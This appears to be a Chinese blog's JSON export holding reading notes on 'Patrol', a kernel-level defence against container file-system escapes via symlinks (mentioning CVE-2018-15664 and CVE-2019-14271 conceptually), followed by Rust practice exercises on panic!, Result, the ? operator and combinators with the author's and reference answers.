使用特定的信息，比如容器文件系统的根路径，操作系统可以通过dentry树确定dentry的范围。此外，我们结合了静态初始呈现和动态路径查找呈现机制来完成区分和隔离机制(详见4.3节)。 然而，许多现有的容器工具提供了一个“共享卷”接口(例如’ docker run -v ‘)，它允许在容器之间或在主机和容器之间共享文件，这使得呈现更加复杂。 为了解决这个问题，我们定义在考虑实际容器文件访问场景时使用多个安全级别。目标文件可以位于以下三种文件之一:在容器文件系统中，在主机的文件系统上，或者在主机和(多个)容器之间共享。首先，正如我们的威胁模型(第3.1节)所描述的，容器是不可信的。攻击者可以操纵其容器中的所有内容，因此我们必须对每个容器的文件系统应用最严格的访问控制策略。为了将数据持久化到共享卷中，底层实现使用“bind mount”1将主机中的路径绑定到容器。共享卷可以看作是容器文件系统的扩展，但是内容可以由不同的共享方访问。因此，其次，我们应该在运行时设置标签，以区分对共享卷具有访问权限的主题。最后，主机文件具有最低的风险级别(即最高的安全级别)，只能由主机进程访问。 访问控制和策略实施。 呈现之后，Patrol知道分配给每一方的条目。这允许访问控制措施的实现，最终阻止任何恶意的企图。为了阻止容器逃逸，一个简单的策略是，容器中的任何文件路径都不能在容器文件系统之外被解析。然而，这种简单的访问控制设计是不准确和全面的。例如，属于容器工具的主机进程具有对容器外部对象的访问权限，而该访问请求不应由容器内部的应用程序诱导。因此，我们还需要限制路径解析请求，这些请求来自主机进程，但意味着在容器内产生影响。 我们的访问控制策略(如第4.4节所述)在第4.5节所述的路径查找过程中强制执行。我们的策略包括检查路径解析结果和文件执行权限。这些策略对应于我们设计的两种类型的规则——一种与对象访问有关，另一种与控制传输有关。 为了确保策略执行不会显著影响系统性能并充分调节访问，我们拦截所有路径解析请求，这是支撑Patrol开发的核心概念。我们将Patrol设计为与x86架构上的Linux内核5.4.1兼容，总共插入大约420个loc，这些loc总是被调用并且足够小。为了确保完全兼容，我们还改进了Patrol的实现，以充分利用内核对特定信息的推理能力(见4.6节)。这意味着它可以在内核中应用，而不会影响上层应用程序。我们使用启发式规则来包含符号链接的解析范围。 Multi-Stage Rendering从VFS中，内核无法判断目录条目(dentry)对象是否属于容器。因此，我们在VFS中标记dentries来区分它们。同时，为了识别最终获得的dentry在路径查找过程中是否存在安全风险，这里我们将静态(初始呈现)和动态(路径查找呈现)方法结合起来并使用此多阶段呈现策略来跟踪路径查找过程所跨越的范围，以便以后进行访问控制。 在不同范围上的初始渲染。 我们给出了作用域的定义，它是属于容器或共享卷的一组条目，其功能受我们的安全策略限制。 我们扩展了PID命名空间结构，添加了一个enum变量“security_level”作为安全级别标志。该标志有三个可能的值:strict (-2)， shared(-1)和normal(0)，它们分别代表三个范围。为了标记不同的作用域，扩展了’ dentry ‘结构，并添加了PID名称空间指针作为标记，用于区分当前dentry所属的名称空间。PID名称空间中的安全级别标志表示入口的危险级别。由于我们不信任容器，容器中的文件(由dentries引用)应该被标记为最高风险级别(也就是最低安全级别)——“strict”。顾名思义，我们将分别为共享卷和主机中的dentry分配“shared”和“normal”。这种呈现策略的优点是，名称空间可以自然地区分不同的容器，并可用于防止以后在主机和容器之间进行非法访问。 在容器启动期间，将创建一个相关的文件系统，并为容器的dentry分配一个范围唯一的标记。pivot_root函数用于将容器进程切换到容器rootfs的根目录。此时，我们使用pivot_root的目标目录作为起点，遍历其下的所有dentry。dentry是递归地遍历的，如果一个dentry是挂载点，那么属于挂载文件系统的dentry也会被标记。属于容器的入口的安全级别标志被设置为“strict”。在共享卷的情况下，被绑定挂载的文件系统由主机和容器共享。分配一个新的临时PID名称空间来标记共享卷中的dentry，并将安全级别标志设置为“shared”。 。仅仅依靠基于初始PID名称空间的dentry标识是不足以进行访问控制的。例如，当主机进程访问并解析容器中的符号链接时，可以获得主机文件的dentry。 路径查找结果表明主机进程访问了一个主机文件，这似乎是合法的。但是，该进程实际上进入了一个不受信任的容器文件系统，并且通过恶意符号链接诱导了对容器外部的非法访问。 这将带来重大的安全风险，需要加以控制。 由于路径查找将跨越主机和容器之间的名称空间，因此应该执行动态路径查找呈现，以确定此查找过程是否进入了具有较低安全级别的名称空间。 路径查找渲染 仅仅依靠基于初始PID名称空间的dentry标识是不足以进行访问控制的。例如，当主机进程访问并解析容器中的符号链接时，可以获得主机文件的dentry。 路径查找结果表明主机进程访问了一个主机文件，这似乎是合法的。但是，该进程实际上进入了一个不受信任的容器文件系统，并且通过恶意符号链接诱导了对容器外部的非法访问。 这将带来重大的安全风险，需要加以控制。 由于路径查找将跨越主机和容器之间的名称空间，因此应该执行动态路径查找渲染，以确定此查找过程是否进入了具有较低安全级别的名称空间。 在路径查找过程中，’ nameidata ‘对象用于记录中间结果。因此，我们向该对象添加一个带有PID名称空间标签的成员，以跟踪在每次路径查找中遍历的最危险范围，并使用当前进程的PID名称空间指针在路径查找开始时初始化该标签。此外，我们通过拦截内核函数path_to_nameidata在路径查找的每一步调用来执行动态渲染，以将渲染结果更新为’ nameidata ‘对象。添加到该函数中的呈现过程首先将’ nameidata ‘中的当前标记与刚刚发现的dentry中的标记进行比较，然后将’ nameidata ‘中的标记呈现为具有较低安全级别的标记。这种呈现在每个路径查找过程中都是不可逆的，以确保可以识别从可信环境到不可信环境的访问。我们在图4中展示了示例:这里的子图描述了三种不同类型的路径查找过程中的动态呈现，包括主机进程对容器和共享卷中的资源的访问，以及容器进程对共享卷中的资源的访问。这些图中的每个箭头都描述了查找dentry和调用path_to_nameidata函数的步骤，而箭头的颜色显示了在’ nameidata ‘对象中呈现的安全级别。在这些颜色中，白色表示最高安全级别(“normal”)，黄色阴影表示第二高级别(“shared”)，最低安全级别(“strict”)用实黄色表示。 Access Control Policies渲染之后，我们可以强制执行由某些标记确定的访问控制。一般的访问控制规则如下。 由于容器不受信任，因此容器进程肯定不能在主机上读取、写入或执行任何文件，而主机进程也不能执行容器内的文件。共享卷也可以看作是容器文件系统的一部分，因此我们还需要限制主机在这些共享卷上的行为。 我们参考了基于软件的故障隔离中概述的规则制定指南。根据数据访问和控制流策略设计的原则，制定了两条策略。 P1 -约束对象访问结果。 第一条规则是对路径解析结果进行沙箱处理。只要路径查找进入不受信任范围(无论是从容器开始查找还是稍后进入容器)，路径查找的最终返回值(结果)必须位于此不受信任区域。 P2 -约束控制转移行为。 第二个策略是由不受信任的容器进行的控制流传输必须留在不受信任的区域内。任何受信任区域(具有更高的安全级别)中的进程都不允许执行不受信任范围中的文件。更具体地说，任何从容器的可执行文件派生出来但实际在主机上执行的新进程都应该被阻止，因为控制权已经转移到恶意容器。主机被标识为受信任区域，而所有其他区域对主机来说都是不受信任的，因此不受信任的容器文件系统中的文件不允许由主机执行。 Path Lookup Interception我们的实现通过在某些内核函数中插入某些检查和放置栅栏来提供安全监视机制，使这两个策略成为一个完整的解决方案。 我们在路径查找的例程中实施访问控制策略，更具体地说，在内核函数complete_walk中。 在路径查找过程中，执行流必须经过此函数。complete_walk是一个处理路径查找最终结果的函数。因此，在其中实施访问控制可以有效地覆盖路径查找过程，而不会丢失任何请求。 为了执行P1, Patrol将检查进程的标记是否与渲染阶段分配给dentry的标记一致。 如果进程中的PID名称空间指针，’ nameidata ‘中的PID名称空间标记和刚刚获得的dentry中的PID名称空间标记不同，则在函数complete_walk中执行以下细粒度访问控制。如果进程标记的安全级别低于查找过程结束时发现的最终条目的标记，则强制首先阻止访问。当容器进程试图访问主机的文件时，可能会发生这种情况。此外，当最后一个dentry的标记的安全级别不是共享的并且高于’ nameidata ‘对象中的标记时，访问也会被阻止。通过这种方式，P1可以防止符号链接解析作弊的问题(在3.2节中描述)。更具体地说，利用此类漏洞的CVE-2018-15664将启动路径查找，以发现应该从容器复制的文件。如图5(左)所示，在此路径查找进入容器文件系统后，’ nameidate ‘对象被标记为最低安全级别，而容器内恶意符号链接误导路径查找过程，以发现具有最高安全级别的最终dentry。此结果与P1强制执行的禁用情况一致，P1在路径查找结束时被激活，以终止此类非法访问。 此外，从主机到共享卷的访问(但其结果最终在共享卷之外解析)可以受到P1的限制，因为存在从危险区域到可信区域的访问路径(可能通过符号链接)。 为了执行P2，我们的防御将在路径查找期间对要打开的目标文件执行执行权限检查。为了更好地促进检查，我们在’ nameidata ‘结构中添加了访问模式标志作为成员，以指示在路径查找之后是否执行。这个访问模式标志是从启动路径查找的系统调用服务例程(如sys_open或sys_execve)的参数中检索和初始化的。如果调用sycall服务例程的进程的PID名称空间和dentry中的PID名称空间标签不一样，patrol开始在complete_walk中检查P2是否满足。一旦进程拥有执行权限，并且该进程的安全级别标志大于dentry中的安全级别标志，就会阻止对dentry的访问。 图5(右)描述了P2如何阻止利用CVE-2019-14271漏洞的攻击。在攻击过程中，安全级别最高的Docker进程会发起一次路径查找，查找需要执行的动态链接库。但是，最后发现的dentry具有最低的安全级别，这表明该库位于容器中。因此，P2在路径查找的最后被强制执行，以终止将要执行具有较低安全级别的文件(例如，’ nsswitch ‘)的Docker进程。 Optimizations for Compatibility为了在用户空间应用程序中实现完全透明，我们实现了两种优化方案。 Pivot_root overloading 由于pivot_root系统调用是切换到容器文件系统的基本操作，因此Patrol可以从中截取’ new_root ‘参数，以指示严格作用域的根路径。当系统调用被重载时，将执行以下函数。从接收到的参数——目标根的路径开始，它递归地遍历其下所有文件系统的目录条目，并使用当前进程的严格范围标记(在4.3节中描述)来标记相关的条目。只有当调用pivot_root系统调用的进程位于与其父进程不同的挂载名称空间中时，上述重载函数才会生效。 Symlink containing 为了更好的可用性和阻止我们严格范围内恶意符号链接的影响，Patrol可以强制执行额外的限制，以确保所有符号链接都在每个严格&#x2F;共享范围的正确根目录下解析，而不是简单地阻止它们。 这里还重载了内核函数trailing_symlink，用于重置查找起点，这是不能绕过的，因为符号链接应该而且只能通过它来解析。 我们在PID命名空间结构中添加一个成员’ root_path ‘，它将存储每个作用域的根目录。当调用pivot_root时，Patrol将容器rootfs的根目录设置为’ root_path ‘变量。在trailing_symlink中，Patrol在当前路径查找过程中获取’ nameidata ‘中的命名空间标签，即指向PID命名空间结构的指针;然后，根据’ root_path ‘重置查找起点(在2.1节中描述)。由于我们防御的预期目标是防止符号链接在不可信范围之外被解析，因此我们定义了以下规则:如果在容器中解析符号链接，则查找起点更新为根据标记保存的根路径;如果从容器解析共享卷中的符号链接，则查找起点仍然是保存的根路径;如果从主机进程解析共享卷中的符号链接，则将起点设置为共享卷的挂载点。 SECURITY ANALYSIS在本节中，我们将演示我们提出的防御巡逻可以通过形式化分析增强容器的文件系统隔离。具体来说，我们将影响VFS中路径查找结果的操作(例如，系统调用服务例程)建模为一个转换系统，并利用Spin(一种现成的模型检查)工具)来识别具体模型中的帕米尔缺陷。结果表明，Patrol消除了当前容器文件系统隔离中发现的所有缺陷。 更具体地说，路径查找是通过搜索VFS中的dentry树将路径字符串从用户空间映射到内核空间中相应的dentry的唯一方法。此搜索的起始点由执行路径查找的进程的根目录或当前工作目录决定。如果找到了dentry，则在权限检查通过后，进程可以通过该dentry所指向的inode访问与其关联的文件。为了阻止主机和容器之间的非法访问，Patrol将隔离扩展到dentry，并对Linux的路径解析例程实施访问控制。为了正式评估Patrol的有效性，我们首先建立了一个通用模型来描述与VFS中路径查找相关的状态和状态转换(第5.1节)。 然后，我们基于一般模型定义实现两个具体模型(一个具有原始路径查找，另一个将Patrol集成到路径查找中)，并使用Spin查找这两个模型中的缺陷(第5.2节)。 EVALUATIONDISCUSSIONRELATED WORKCONCLUSION本文系统地研究了容器和主机之间文件系统不完全隔离及其相互作用所引起的Pamir风险。这种类型的风险对仅通过容器工具进行缓解构成了重大挑战。我们的研究表明，消除Pamir风险的巨大障碍是容器工具使用的第三方组件，但在用户领域没有合理的解决方案来解决这一障碍。此外，我们提出了一种基于内核的文件系统隔离技术，称为Patrol。模型检验表明，Patrol完全消除了帕米尔风险。我们的方法只给内核和容器工具带来很小的性能损失，同时提供了出色的兼容性。我们的发现和新的隔离增强朝着更好地为操作系统级虚拟化设计健壮的隔离迈出了一步。","categories":[{"name":"论文精读","slug":"论文精读","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/"},{"name":"内核安全","slug":"论文精读/内核安全","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"文件系统","slug":"文件系统","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"}]},{"title":"Rust学习 练习12 包和模块","slug":"Rust学习-练习12-包和模块","date":"2023-09-13T05:08:07.000Z","updated":"2023-09-13T11:32:12.626Z","comments":true,"path":"2023/09/13/Rust学习-练习12-包和模块/","link":"","permalink":"http://example.com/2023/09/13/Rust%E5%AD%A6%E4%B9%A0-%E7%BB%83%E4%B9%A012-%E5%8C%85%E5%92%8C%E6%A8%A1%E5%9D%97/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"Rust学习 练习11 返回值和panic!","slug":"Rust学习-练习11-返回值和panic","date":"2023-09-12T12:13:13.000Z","updated":"2023-09-12T14:00:38.128Z","comments":true,"path":"2023/09/12/Rust学习-练习11-返回值和panic/","link":"","permalink":"http://example.com/2023/09/12/Rust%E5%AD%A6%E4%B9%A0-%E7%BB%83%E4%B9%A011-%E8%BF%94%E5%9B%9E%E5%80%BC%E5%92%8Cpanic/","excerpt":"panic！深入剖析Rust 中最简单的错误处理方式就是使用 panic。它会打印出一条错误信息并打印出栈调用情况，最终结束当前线程: 若 panic 发生在 main 线程，那程序会随之退出 如果是在生成的( spawn )子线程中发生 panic, 那么当前的线程会结束，但是程序依然会继续运行","text":"panic！深入剖析Rust 中最简单的错误处理方式就是使用 panic。它会打印出一条错误信息并打印出栈调用情况，最终结束当前线程: 若 panic 发生在 main 线程，那程序会随之退出 如果是在生成的( spawn )子线程中发生 panic, 那么当前的线程会结束，但是程序依然会继续运行 🌟🌟 123456789101112131415161718// 填空fn drink(beverage: &amp;str) &#123; if beverage == &quot;lemonade&quot; &#123; println!(&quot;Success!&quot;); // 实现下面的代码 __ &#125; println!(&quot;Exercise Failed if printing out this line!&quot;);&#125;fn main() &#123; drink(__); println!(&quot;Exercise Failed if printing out this line!&quot;);&#125; My Answer 123456789101112131415161718// 填空fn drink(beverage: &amp;str) &#123; if beverage == &quot;lemonade&quot; &#123; println!(&quot;Success!&quot;); // 实现下面的代码 panic!(&quot;Test&quot;); &#125; println!(&quot;Exercise Failed if printing out this line!&quot;);&#125;fn main() &#123; drink(&quot;lemonade&quot;); println!(&quot;Exercise Failed if printing out this line!&quot;);&#125; Answer 1234567891011121314151617use core::panic;fn drink(beverage: &amp;str) &#123; if beverage == &quot;lemonade&quot; &#123; println!(&quot;Success!&quot;); // IMPLEMENT the below code panic!(&quot;drinked, duang.....peng!&quot;) &#125; println!(&quot;Exercise Failed if printing out this line!&quot;);&#125;fn main() &#123; drink(&quot;lemonade&quot;); println!(&quot;Exercise Failed if printing out this line!&quot;);&#125; 常见的panic 🌟🌟 12345678910111213141516171819202122232425262728293031323334// 修复所有的 panic，让代码工作fn main() &#123; assert_eq!(&quot;abc&quot;.as_bytes(), [96, 97, 98]); let v = vec![1, 2, 3]; let ele = v[3]; let ele = v.get(3).unwrap(); // 大部分时候编译器是可以帮我们提前发现溢出错误，并阻止编译通过。但是也有一些时候，这种溢出问题直到运行期才会出现 let v = production_rate_per_hour(2); divide(15, 0); println!(&quot;Success!&quot;)&#125;fn divide(x:u8, y:u8) &#123; println!(&quot;&#123;&#125;&quot;, x / y)&#125;fn production_rate_per_hour(speed: u8) -&gt; f64 &#123; let cph: u8 = 221; match speed &#123; 1..=4 =&gt; (speed * cph) as f64, 5..=8 =&gt; (speed * cph) as f64 * 0.9, 9..=10 =&gt; (speed * cph) as f64 * 0.77, _ =&gt; 0 as f64, &#125;&#125;pub fn working_items_per_minute(speed: u8) -&gt; u32 &#123; (production_rate_per_hour(speed) / 60 as f64) as u32&#125; My Answer 12345678910111213141516171819202122232425262728293031323334// 修复所有的 panic，让代码工作fn main() &#123; assert_eq!(&quot;abc&quot;.as_bytes(), [97, 98, 99]); let v = vec![1, 2, 3]; let ele = v[2]; let ele = v.get(2).unwrap(); // 大部分时候编译器是可以帮我们提前发现溢出错误，并阻止编译通过。但是也有一些时候，这种溢出问题直到运行期才会出现 let v = production_rate_per_hour(2); divide(15, 1); println!(&quot;Success!&quot;)&#125;fn divide(x:u8, y:u8) &#123; println!(&quot;&#123;&#125;&quot;, x / y)&#125;fn production_rate_per_hour(speed: u8) -&gt; f64 &#123; let cph: u8 = 22; match speed &#123; 1..=4 =&gt; (speed * cph) as f64, 5..=8 =&gt; (speed * cph) as f64 * 0.9, 9..=10 =&gt; (speed * cph) as f64 * 0.77, _ =&gt; 0 as f64, &#125;&#125;pub fn working_items_per_minute(speed: u8) -&gt; u32 &#123; (production_rate_per_hour(speed) / 60 as f64) as u32&#125; Answer 1234567891011121314151617181920212223242526272829303132333435// MAKE the code work by fixing all panicsfn main() &#123; assert_eq!(&quot;abc&quot;.as_bytes(), [97, 98, 99]); let v = vec![1, 2, 3]; let ele = v[2]; // unwrap may panic when get return a None let ele = v.get(2).unwrap(); // Sometimes, the compiler is unable to find the overflow errors for you in compile time ,so a panic will occur let v = production_rate_per_hour(2); // because of the same reason as above, we have to wrap it in a function to make the panic occur divide(15, 1); println!(&quot;Success!&quot;)&#125;fn divide(x:u8, y:u8) &#123; println!(&quot;&#123;&#125;&quot;, x / y)&#125;fn production_rate_per_hour(speed: u8) -&gt; f64 &#123; let cph: u8 = 21; match speed &#123; 1..=4 =&gt; (speed * cph) as f64, 5..=8 =&gt; (speed * cph) as f64 * 0.9, 9..=10 =&gt; (speed * cph) as f64 * 0.77, _ =&gt; 0 as f64, &#125;&#125;pub fn working_items_per_minute(speed: u8) -&gt; u32 &#123; (production_rate_per_hour(speed) / 60 as f64) as u32&#125; 详细的栈调用信息默认情况下，栈调用只会展示最基本的信息: 123thread &#x27;main&#x27; panicked at &#x27;index out of bounds: the len is 3 but the index is 99&#x27;, src/main.rs:4:5note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace 但是有时候，我们还希望获取更详细的信息: 🌟 1234567891011121314151617181920## 填空以打印全部的调用栈## 提示: 你可以在之前的默认 panic 信息中找到相关线索$ __ cargo runthread &#x27;main&#x27; panicked at &#x27;assertion failed: `(left == right)` left: `[97, 98, 99]`, right: `[96, 97, 98]`&#x27;, src/main.rs:3:5stack backtrace: 0: rust_begin_unwind at /rustc/9d1b2106e23b1abd32fce1f17267604a5102f57a/library/std/src/panicking.rs:498:5 1: core::panicking::panic_fmt at /rustc/9d1b2106e23b1abd32fce1f17267604a5102f57a/library/core/src/panicking.rs:116:14 2: core::panicking::assert_failed_inner 3: core::panicking::assert_failed at /rustc/9d1b2106e23b1abd32fce1f17267604a5102f57a/library/core/src/panicking.rs:154:5 4: study_cargo::main at ./src/main.rs:3:5 5: core::ops::function::FnOnce::call_once at /rustc/9d1b2106e23b1abd32fce1f17267604a5102f57a/library/core/src/ops/function.rs:227:5note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace. unwinding和abort当出现 panic! 时，程序提供了两种方式来处理终止流程：栈展开和直接终止。 其中，默认的方式就是 栈展开，这意味着 Rust 会回溯栈上数据和函数调用，因此也意味着更多的善后工作，好处是可以给出充分的报错信息和栈调用信息，便于事后的问题复盘。直接终止，顾名思义，不清理数据就直接退出程序，善后工作交与操作系统来负责。 对于绝大多数用户，使用默认选择是最好的，但是当你关心最终编译出的二进制可执行文件大小时，那么可以尝试去使用直接终止的方式，例如下面的配置修改 Cargo.toml 文件，实现在 release 模式下遇到 panic 直接终止： 12345#![allow(unused)]fn main() &#123;[profile.release]panic = &#x27;abort&#x27;&#125; result and ？Result&lt;T&gt; 是一个枚举类型用于描述返回的结果或错误，它包含两个成员(变体 variants) : Ok(T): 返回一个结果值 T Err(e): 返回一个错误，e 是具体的错误值 简而言之，如果期待一个正确的结果，就返回 Ok，反之则是 Err。 🌟🌟 1234567891011121314151617181920// 填空并修复错误use std::num::ParseIntError;fn multiply(n1_str: &amp;str, n2_str: &amp;str) -&gt; __ &#123; let n1 = n1_str.parse::&lt;i32&gt;(); let n2 = n2_str.parse::&lt;i32&gt;(); Ok(n1.unwrap() * n2.unwrap())&#125;fn main() &#123; let result = multiply(&quot;10&quot;, &quot;2&quot;); assert_eq!(result, __); let result = multiply(&quot;t&quot;, &quot;2&quot;); assert_eq!(result.__, 8); println!(&quot;Success!&quot;)&#125; My Answer 1234567891011121314151617181920// 填空并修复错误use std::num::ParseIntError;fn multiply(n1_str: &amp;str, n2_str: &amp;str) -&gt; Result&lt;i32,ParseIntError&gt; &#123; let n1 = n1_str.parse::&lt;i32&gt;()?; let n2 = n2_str.parse::&lt;i32&gt;()?; Ok(n1 * n2)&#125;fn main() &#123; let result = multiply(&quot;10&quot;, &quot;2&quot;); assert_eq!(result, Ok(20)); let result = multiply(&quot;4&quot;, &quot;2&quot;); assert_eq!(result.unwrap(), 8); println!(&quot;Success!&quot;)&#125; Answer 1234567891011121314151617use std::num::ParseIntError;fn multiply(n1_str: &amp;str, n2_str: &amp;str) -&gt; Result&lt;i32, ParseIntError&gt; &#123; let n1 = n1_str.parse::&lt;i32&gt;(); let n2 = n2_str.parse::&lt;i32&gt;(); Ok(n1.unwrap() * n2.unwrap())&#125;fn main() &#123; let result = multiply(&quot;10&quot;, &quot;2&quot;); assert_eq!(result, Ok(20)); let result = multiply(&quot;4&quot;, &quot;2&quot;); assert_eq!(result.unwrap(), 8); println!(&quot;Success!&quot;)&#125; ?? 跟 unwrap 非常像，但是 ? 会返回一个错误，而不是直接 panic. 🌟🌟 12345678910111213use std::num::ParseIntError;// 使用 `?` 来实现 multiply// 不要使用 unwrap !fn multiply(n1_str: &amp;str, n2_str: &amp;str) -&gt; __ &#123;&#125;fn main() &#123; assert_eq!(multiply(&quot;3&quot;, &quot;4&quot;).unwrap(), 12); println!(&quot;Success!&quot;)&#125; My Answer 12345678910111213141516use std::num::ParseIntError;// 使用 `?` 来实现 multiply// 不要使用 unwrap !fn multiply(n1_str: &amp;str, n2_str: &amp;str) -&gt; Result&lt;i32,ParseIntError&gt; &#123; let a = n1_str.parse::&lt;i32&gt;()?; let b = n2_str.parse::&lt;i32&gt;()?; Ok(a*b)&#125;fn main() &#123; assert_eq!(multiply(&quot;3&quot;, &quot;4&quot;).unwrap(), 12); println!(&quot;Success!&quot;)&#125; Answer 1234567891011121314use std::num::ParseIntError;// IMPLEMENT multiply with ?// DON&#x27;T use unwrap herefn multiply(n1_str: &amp;str, n2_str: &amp;str) -&gt; Result&lt;i32, ParseIntError&gt; &#123; let n1 = n1_str.parse::&lt;i32&gt;()?; let n2 = n2_str.parse::&lt;i32&gt;()?; Ok(n1 * n2)&#125;fn main() &#123; assert_eq!(multiply(&quot;3&quot;, &quot;4&quot;).unwrap(), 12); println!(&quot;Success!&quot;)&#125; 🌟🌟 123456789101112131415161718192021222324252627282930313233use std::fs::File;use std::io::&#123;self, Read&#125;;fn read_file1() -&gt; Result&lt;String, io::Error&gt; &#123; let f = File::open(&quot;hello.txt&quot;); let mut f = match f &#123; Ok(file) =&gt; file, Err(e) =&gt; return Err(e), &#125;; let mut s = String::new(); match f.read_to_string(&amp;mut s) &#123; Ok(_) =&gt; Ok(s), Err(e) =&gt; Err(e), &#125;&#125;// 填空// 不要修改其它代码fn read_file2() -&gt; Result&lt;String, io::Error&gt; &#123; let mut s = String::new(); __; Ok(s)&#125;fn main() &#123; assert_eq!(read_file1().unwrap_err().to_string(), read_file2().unwrap_err().to_string()); println!(&quot;Success!&quot;)&#125; My Answer 12345678910111213141516171819202122232425262728293031use std::fs::File;use std::io::&#123;self, Read&#125;;fn read_file1() -&gt; Result&lt;String, io::Error&gt; &#123; let f = File::open(&quot;hello.txt&quot;); let mut f = match f &#123; Ok(file) =&gt; file, Err(e) =&gt; return Err(e), &#125;; let mut s = String::new(); match f.read_to_string(&amp;mut s) &#123; Ok(_) =&gt; Ok(s), Err(e) =&gt; Err(e), &#125;&#125;// 填空// 不要修改其它代码fn read_file2() -&gt; Result&lt;String, io::Error&gt; &#123; let mut s = String::new(); File::open(&quot;hello.txt&quot;)?.read_to_string(&amp;mut s)?; Ok(s)&#125;fn main() &#123; assert_eq!(read_file1().unwrap_err().to_string(), read_file2().unwrap_err().to_string()); println!(&quot;Success!&quot;)&#125; Answer 1234567891011121314151617181920212223242526272829use std::fs::File;use std::io::&#123;self, Read&#125;;fn read_file1() -&gt; Result&lt;String, io::Error&gt; &#123; let f = File::open(&quot;hello.txt&quot;); let mut f = match f &#123; Ok(file) =&gt; file, Err(e) =&gt; return Err(e), &#125;; let mut s = String::new(); match f.read_to_string(&amp;mut s) &#123; Ok(_) =&gt; Ok(s), Err(e) =&gt; Err(e), &#125;&#125;fn read_file2() -&gt; Result&lt;String, io::Error&gt; &#123; let mut s = String::new(); File::open(&quot;hello.txt&quot;)?.read_to_string(&amp;mut s)?; Ok(s)&#125;fn main() &#123; assert_eq!(read_file1().unwrap_err().to_string(), read_file2().unwrap_err().to_string()); println!(&quot;Success!&quot;)&#125; map&amp;and_thenmap and and_then 是两个常用的组合器( combinator )，可以用于 Result&lt;T, E&gt; (也可用于 Option&lt;T&gt;). 🌟🌟 12345678910111213use std::num::ParseIntError;// 使用两种方式填空: map, and thenfn add_two(n_str: &amp;str) -&gt; Result&lt;i32, ParseIntError&gt; &#123; n_str.parse::&lt;i32&gt;().__&#125;fn main() &#123; assert_eq!(add_two(&quot;4&quot;).unwrap(), 6); println!(&quot;Success!&quot;)&#125; My Answer 12345678910111213use std::num::ParseIntError;// 使用两种方式填空: map, and thenfn add_two(n_str: &amp;str) -&gt; Result&lt;i32, ParseIntError&gt; &#123; n_str.parse::&lt;i32&gt;().map(|i|i+2)&#125;fn main() &#123; assert_eq!(add_two(&quot;4&quot;).unwrap(), 6); println!(&quot;Success!&quot;)&#125; 12345678910111213use std::num::ParseIntError;// 使用两种方式填空: map, and thenfn add_two(n_str: &amp;str) -&gt; Result&lt;i32, ParseIntError&gt; &#123; n_str.parse::&lt;i32&gt;().and_then(|i|Ok(i+2))&#125;fn main() &#123; assert_eq!(add_two(&quot;4&quot;).unwrap(), 6); println!(&quot;Success!&quot;)&#125; Answer 1234567891011use std::num::ParseIntError;fn add_two(n_str: &amp;str) -&gt; Result&lt;i32, ParseIntError&gt; &#123; n_str.parse::&lt;i32&gt;().map(|num| num +2)&#125;fn main() &#123; assert_eq!(add_two(&quot;4&quot;).unwrap(), 6); println!(&quot;Success!&quot;)&#125; 1234567891011use std::num::ParseIntError;fn add_two(n_str: &amp;str) -&gt; Result&lt;i32, ParseIntError&gt; &#123; n_str.parse::&lt;i32&gt;().and_then(|num| Ok(num +2))&#125;fn main() &#123; assert_eq!(add_two(&quot;4&quot;).unwrap(), 6); println!(&quot;Success!&quot;)&#125; 🌟🌟🌟 123456789101112131415161718192021222324252627282930313233343536373839404142use std::num::ParseIntError;// 使用 Result 重写后，我们使用模式匹配的方式来处理，而无需使用 `unwrap`// 但是这种写法实在过于啰嗦..fn multiply(n1_str: &amp;str, n2_str: &amp;str) -&gt; Result&lt;i32, ParseIntError&gt; &#123; match n1_str.parse::&lt;i32&gt;() &#123; Ok(n1) =&gt; &#123; match n2_str.parse::&lt;i32&gt;() &#123; Ok(n2) =&gt; &#123; Ok(n1 * n2) &#125;, Err(e) =&gt; Err(e), &#125; &#125;, Err(e) =&gt; Err(e), &#125;&#125;// 重写上面的 `multiply` ，让它尽量简介// 提示：使用 `and_then` 和 `map`fn multiply1(n1_str: &amp;str, n2_str: &amp;str) -&gt; Result&lt;i32, ParseIntError&gt; &#123; // 实现...&#125;fn print(result: Result&lt;i32, ParseIntError&gt;) &#123; match result &#123; Ok(n) =&gt; println!(&quot;n is &#123;&#125;&quot;, n), Err(e) =&gt; println!(&quot;Error: &#123;&#125;&quot;, e), &#125;&#125;fn main() &#123; let twenty = multiply1(&quot;10&quot;, &quot;2&quot;); print(twenty); // 下面的调用会提供更有帮助的错误信息 let tt = multiply(&quot;t&quot;, &quot;2&quot;); print(tt); println!(&quot;Success!&quot;)&#125; My Answer 1不会 Answer 123456789101112131415161718192021222324252627282930313233343536373839404142use std::num::ParseIntError;// 使用 Result 重写后，我们使用模式匹配的方式来处理，而无需使用 `unwrap`// 但是这种写法实在过于啰嗦..fn multiply(n1_str: &amp;str, n2_str: &amp;str) -&gt; Result&lt;i32, ParseIntError&gt; &#123; match n1_str.parse::&lt;i32&gt;() &#123; Ok(n1) =&gt; &#123; match n2_str.parse::&lt;i32&gt;() &#123; Ok(n2) =&gt; &#123; Ok(n1 * n2) &#125;, Err(e) =&gt; Err(e), &#125; &#125;, Err(e) =&gt; Err(e), &#125;&#125;// 重写上面的 `multiply` ，让它尽量简介// 提示：使用 `and_then` 和 `map`fn multiply1(n1_str: &amp;str, n2_str: &amp;str) -&gt; Result&lt;i32, ParseIntError&gt; &#123; n1_str.parse::&lt;i32&gt;().and_then(|n1| &#123;n2_str.parse::&lt;i32&gt;().map(|n2|n1*n2)&#125;)&#125;fn print(result: Result&lt;i32, ParseIntError&gt;) &#123; match result &#123; Ok(n) =&gt; println!(&quot;n is &#123;&#125;&quot;, n), Err(e) =&gt; println!(&quot;Error: &#123;&#125;&quot;, e), &#125;&#125;fn main() &#123; let twenty = multiply1(&quot;10&quot;, &quot;2&quot;); print(twenty); // 下面的调用会提供更有帮助的错误信息 let tt = multiply(&quot;2&quot;, &quot;2&quot;); print(tt); println!(&quot;Success!&quot;)&#125; 类型别名如果我们要在代码中到处使用 std::result::Result&lt;T, ParseIntError&gt; 